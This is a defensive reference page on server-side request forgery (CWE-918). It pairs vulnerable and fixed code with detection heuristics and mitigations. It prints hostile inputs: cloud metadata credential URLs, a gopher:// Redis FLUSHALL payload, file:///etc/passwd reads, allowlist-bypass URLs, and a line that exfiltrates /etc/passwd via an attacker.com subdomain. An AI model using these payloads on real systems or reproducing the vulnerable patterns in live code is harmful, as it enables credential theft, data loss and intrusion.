---
description: "CWE-918: Server makes HTTP/protocol requests to attacker-controlled URLs, exposing internal services, cloud metadata, and enabling protocol smuggling."
date: 2026-04-16
tags: [security, cwe, ssrf, cloud, metadata, internal-network, http-client]
level: Advanced
---

# CWE-918: Server-Side Request Forgery

**CWE-918** | OWASP Top 10 A10:2021 | CVSS Base Score range: 5.0-9.8 (Critical when cloud metadata accessible) | Rank 19 in CWE Top 25

## Functional Semantics

SSRF causes the server to act as an HTTP proxy on behalf of the attacker. The server's network identity, IAM credentials, and trust relationships become attacker-accessible. In cloud environments, the metadata service at `169.254.169.254` (AWS IMDSv1, GCP, Azure) exposes instance credentials, roles, and internal configuration without authentication. In on-prem environments, SSRF enables scanning and exploitation of internal services that assume perimeter security.

Two SSRF classes exist: **full SSRF** (response returned to attacker) and **blind/partial SSRF** (no response, but side effects occur — DNS lookup confirms reachability, POST triggers state change, timing reveals port status).

## Root Cause

Applications construct outbound URLs using attacker-controlled components (full URL, hostname, path segment, IP) without validating the resolved network destination. URL parsing inconsistencies between the validation layer and the HTTP client layer create bypasses even when allowlists exist.

## Trigger Conditions

- User supplies a URL for: image/file fetch, webhook registration, URL preview, PDF generation, OAuth callback, import from external service, health check endpoint
- Application constructs a URL using user-supplied hostname, path, or query parameters
- `redirect_uri`, `callback_url`, `next`, `return_to` parameters followed server-side without destination validation
- Internal services lack authentication, assuming only the internal network can reach them

## Affected Ecosystems

| Context | Common SSRF Vector | Risk |
|---|---|---|
| AWS EC2/Lambda | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Credential exfil → full account takeover |
| AWS IMDSv2 | Requires PUT + session token — mitigates basic SSRF | Lower (but still vulnerable via TOCTOU) |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` + `Metadata-Flavor: Google` header | Service account token exfil |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` + `Metadata: true` | MSI token exfil |
| Kubernetes | `https://kubernetes.default.svc/` reachable from pods | API server access with pod service account |
| Docker socket | `http://localhost:2375/containers/json` (if exposed) | Container escape |
| Internal HTTP services | Redis (`gopher://`), Elasticsearch, Consul, etcd | Unauthenticated data access |

## Vulnerable Patterns

### Basic SSRF — user-controlled URL fetched directly

```python
# VULNERABLE: attacker sends url=http://169.254.169.254/latest/meta-data/iam/...
import requests
from flask import request, jsonify

@app.route("/fetch-preview")
def fetch_preview():
    url = request.args.get("url")
    resp = requests.get(url, timeout=5)  # no validation, follows redirects by default
    return jsonify({"content": resp.text[:500]})
```

### Protocol smuggling via gopher://

```
# gopher:// allows arbitrary TCP payloads — can send Redis commands, SMTP, etc.
GET /fetch?url=gopher://internal-redis:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A
```

### Partial SSRF — webhook registration

```javascript
// VULNERABLE: attacker registers internal URL as webhook
// No content returned but POST triggers state change in internal service
app.post("/webhooks/register", async (req, res) => {
    const { callbackUrl } = req.body;
    // No validation — attacker uses http://internal-billing-service/admin/reset
    await db.save({ userId: req.user.id, webhook: callbackUrl });
    // Later, on event: axios.post(callbackUrl, eventData)
    res.json({ ok: true });
});
```

### URL parsing bypass — allowlist circumvention

```python
# VULNERABLE: parseurl and requests disagree on authority
from urllib.parse import urlparse
import requests

ALLOWLIST = {"api.example.com", "cdn.example.com"}

def fetch_safe(url):
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWLIST:
        raise ValueError("Domain not allowed")
    # Bypasses:
    # http://api.example.com@192.168.1.1/ — urlparse.hostname = "api.example.com", requests connects to 192.168.1.1
    # http://api.example.com#@192.168.1.1/ — fragment confusion
    # http://192.168.1.1%2F@api.example.com/ — URL encoding
    return requests.get(url)
```

## Fixed Patterns

### Allowlist with post-resolution IP check

```python
import socket
import ipaddress
import requests
from urllib.parse import urlparse

ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}

# RFC 1918 + link-local + loopback ranges
BLOCKED_NETWORKS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),   # link-local / metadata
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("::1/128"),
    ipaddress.ip_network("fc00::/7"),          # IPv6 ULA
]

def is_safe_url(url: str) -> bool:
    try:
        parsed = urlparse(url)
    except Exception:
        return False

    # Allowlist by hostname (before DNS resolution)
    if parsed.hostname not in ALLOWED_HOSTS:
        return False

    # Enforce scheme
    if parsed.scheme not in ("http", "https"):
        return False

    # Resolve DNS and check every returned IP
    try:
        infos = socket.getaddrinfo(parsed.hostname, parsed.port or 443)
    except socket.gaierror:
        return False

    for (_fam, _type, _proto, _canon, sockaddr) in infos:
        ip = ipaddress.ip_address(sockaddr[0])
        if any(ip in net for net in BLOCKED_NETWORKS):
            return False

    return True

def fetch_url(url: str):
    if not is_safe_url(url):
        raise PermissionError("URL not allowed")
    # disable_redirects: each redirect must be re-validated
    resp = requests.get(url, allow_redirects=False, timeout=5)
    if resp.status_code in (301, 302, 303, 307, 308):
        return fetch_url(resp.headers["Location"])  # recursive re-validation
    return resp
```

### IMDSv2 enforcement (AWS infrastructure-level fix)

```bash
# Require IMDSv2 — PUT + TTL token required before GET; mitigates most SSRF
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxx \
  --http-put-response-hop-limit 1 \
  --http-tokens required
```

### Webhook — deny internal destinations at registration

```javascript
const dns = require("dns").promises;
const ipRangeCheck = require("ip-range-check"); // npm: ip-range-check

const BLOCKED_RANGES = [
    "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "169.254.0.0/16", "127.0.0.0/8", "::1/128"
];

async function validateWebhookUrl(urlStr) {
    const url = new URL(urlStr); // throws on malformed
    if (!["http:", "https:"].includes(url.protocol)) throw new Error("Protocol not allowed");

    const { address } = await dns.lookup(url.hostname);
    if (ipRangeCheck(address, BLOCKED_RANGES)) {
        throw new Error("Internal addresses not allowed for webhooks");
    }
    return true;
}
```

## Detection Heuristics

**Static analysis triggers:**
- `requests.get(url)`, `urllib.request.urlopen(url)`, `httpx.get(url)` where `url` derives from request parameters
- `axios.get(req.body.url)`, `fetch(req.query.callbackUrl)` — direct parameter-to-HTTP-client flow
- `curl_exec($ch)` after `curl_setopt($ch, CURLOPT_URL, $_GET[...])` in PHP
- `java.net.URL(userInput).openStream()` or `HttpClient.send()` with user-controlled URI
- URL constructed by string concatenation: `"http://" + req.params.host + "/api/"`
- `allow_redirects=True` (default in requests) combined with user-supplied URL

**Configuration triggers:**
- IMDSv1 not disabled on EC2 instances (no `--http-tokens required`)
- Pod service account with excessive RBAC permissions (SSRF → Kubernetes API)
- Docker API exposed on `0.0.0.0:2375` (no TLS, reachable from containers)

**False positive indicators:**
- URL constructed from a static allowlist with no user-controlled component (e.g., `WEBHOOK_URL = os.getenv("WEBHOOK_URL"); requests.post(WEBHOOK_URL, data=payload)`) — environment variable set at deploy time, not user-controlled.
- Fetch of user-supplied URL where the resolved IP is enforced to be outside RFC 1918 *and* redirects are disabled *and* the response content is not returned to the requester (blind fetch for non-security purposes) — still flag for review but lower severity.
- Internal health check services calling themselves via localhost intentionally.

## DNS Rebinding

DNS rebinding bypasses IP-based allowlists by returning a valid IP on first resolution (passing the check), then returning a private IP on subsequent resolution (used by the HTTP client). Mitigation: resolve DNS once, pin the IP for the connection lifetime, and block if the IP changes.

```python
# Pattern to detect: check at validation time, connect at different time
# VULNERABLE sequence:
ip = socket.gethostbyname(hostname)  # returns 93.184.216.34 (valid)
check_ip_not_private(ip)             # passes
time.sleep(0.1)                      # TTL expires, attacker's DNS returns 10.0.0.1
requests.get(f"http://{hostname}/")  # connects to 10.0.0.1
```

## Protocol Smuggling Payloads

When the HTTP client supports non-HTTP schemes (curl, Java URL, some Python libraries):

| Scheme | Effect |
|---|---|
| `file:///etc/passwd` | Local file read |
| `gopher://redis:6379/_FLUSHALL` | Arbitrary TCP payload (Redis, SMTP, FTP) |
| `dict://redis:6379/INFO` | Dict protocol query |
| `ftp://internal-ftp/` | FTP directory listing |
| `http://localhost:9200/_cat/indices` | Elasticsearch via loopback |

Fix: allowlist `http` and `https` only; reject all other schemes before connecting.

## Partial SSRF Impact

Even without response body returned to attacker:
- **Port scanning** via timing: connection refused (<10ms) vs filtered (timeout) vs open (>0ms response)
- **DNS exfiltration** via subdomain: `http://$(cat /etc/passwd | base64).attacker.com/` in SSTI → SSRF chain
- **State mutation** via POST to internal admin endpoints (password reset, cache flush, job trigger)
- **Log injection** by causing internal service to log attacker-controlled data

## See Also

- [[cwe-502-deserialization]] — SSRF to Redis/Memcache can trigger deserialization gadget chains
- CWE-020: Input Validation — URL validation is the primary control
- CWE-601: Open Redirect — open redirect can be chained to bypass SSRF allowlists (redirect to internal)
- CWE-611: XML External Entities — XXE can trigger SSRF via external entity fetch
